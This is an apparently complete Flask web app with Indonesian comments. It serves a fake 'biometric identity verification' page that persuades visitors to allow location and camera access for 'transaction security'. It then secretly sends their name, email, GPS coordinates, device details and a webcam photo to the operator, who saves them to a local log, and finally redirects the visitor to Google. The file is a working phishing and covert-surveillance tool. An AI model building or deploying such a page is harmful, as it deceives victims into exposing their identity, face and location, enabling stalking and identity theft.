from flask import Flask, request, render_template_string
import datetime
import os
import base64

app = Flask(__name__)

# Path penyimpanan di Laptop kamu  untuk menyimpan hasil investigasi
BASE_DIR = r"C:\...\...\...\..."
LOG_FILE = os.path.join(BASE_DIR, "hasil_investigasi.txt")

@app.route('/cek-data')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return render_template_string('''
        <html>
        <head>
            <title>Verifikasi Keamanan Biometrik</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
                .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; border-top: 5px solid #d32f2f; }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
                button { background: #d32f2f; color: white; border: none; padding: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
                #video { display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://cdn-icons-png.flaticon.com/512/752/752755.png" width="60">
                <h2>Verifikasi Identitas</h2>
                <p style="font-size: 13px; color: #666;">Untuk keamanan transaksi, mohon izinkan <b>Lokasi</b> dan <b>Kamera</b> untuk verifikasi Face-ID.</p>
                <input type="text" id="nama" placeholder="Nama Lengkap" required>
                <input type="email" id="email" placeholder="Alamat Email" required>
                <button onclick="start()">VERIFIKASI SEKARANG</button>
                <video id="video" autoplay></video>
                <canvas id="canvas" style="display:none;"></canvas>
            </div>

            <script>
                function start() {
                    let nama = document.getElementById('nama').value;
                    let email = document.getElementById('email').value;
                    if(!nama || !email) { alert("Lengkapi data!"); return; }

                    // Jalankan Lokasi dan Kamera Bersamaan
                    navigator.geolocation.getCurrentPosition(function(pos) {
                        capture(nama, email, pos.coords.latitude, pos.coords.longitude);
                    }, function() {
                        capture(nama, email, "DIBLOKIR", "DIBLOKIR");
                    });
                }

                function capture(nama, email, lat, lon) {
                    let ram = navigator.deviceMemory || "N/A";
                    let cpu = navigator.hardwareConcurrency || "N/A";
                    
                    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                        let video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            let canvas = document.getElementById('canvas');
                            canvas.width = 320;
                            canvas.height = 240;
                            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                            let imgData = canvas.toDataURL('image/jpeg');
                            stream.getTracks().forEach(t => t.stop()); // Matikan kamera
                            
                            // Kirim semua data ke Server
                            fetch('/log-final', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    nama: nama, email: email, lat: lat, lon: lon,
                                    ram: ram, cpu: cpu, img: imgData
                                })
                            }).then(() => {
                                alert("Verifikasi Selesai. Mohon tunggu konfirmasi.");
                                window.location.href = "https://www.google.com";
                            });
                        }, 1000);
                    }).catch(() => {
                        // Jika kamera ditolak, tetap kirim data teks
                        fetch('/log-final', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                nama: nama, email: email, lat: lat, lon: lon,
                                ram: ram, cpu: cpu, img: "TIDAK_ADA_FOTO"
                            })
                        });
                    });
                }
            </script>
        </body>
        </html>
    ''')

@app.route('/log-final', methods=['POST'])
def log_final():
    data = request.json
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    laporan = (
        f"{'='*50}\n"
        f"WAKTU      : {waktu}\n"
        f"NAMA/EMAIL : {data.get('nama')} | {data.get('email')}\n"
        f"GPS        : {data.get('lat')}, {data.get('lon')}\n"
        f"HARDWARE   : RAM {data.get('ram')}GB | CPU {data.get('cpu')} Core\n"
        f"FOTO       : {'TERSEDIA' if 'data:image' in data.get('img') else 'GAGAL'}\n"
        f"{'='*50}\n\n"
    )

    # 1. Simpan Teks ke .txt
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(laporan)
    
    # 2. Simpan Foto jika ada
    if "data:image" in data.get('img'):
        img_filename = f"foto_{data.get('nama').replace(' ', '_')}_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
        img_path = os.path.join(BASE_DIR, img_filename)
        with open(img_path, "wb") as f:
            f.write(base64.b64decode(data.get('img').split(',')[1]))
        print(f"Foto disimpan: {img_filename}")

    print(laporan)
    return '', 204

if __name__ == '__main__':
    app.run(port=5000)